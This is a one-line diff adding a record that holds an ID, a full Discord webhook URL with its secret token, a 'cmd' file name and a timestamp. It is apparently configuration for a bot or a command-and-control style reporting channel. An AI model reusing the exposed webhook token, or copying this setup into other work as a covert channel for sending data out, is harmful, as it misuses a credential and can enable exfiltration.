@@ -1,0 +1,1 @@
+setup:EBWVJKZP:https://discord.com/api/webhooks/1555238432752537642/Z7__wGvGgaMvQT-2uP0efAF6-8A12BLRTZxU1YDjRWfPo2pqpTC_4d8t8vDsfi-xY8W5;cmd-ebwvjkzp.txt|1790868138
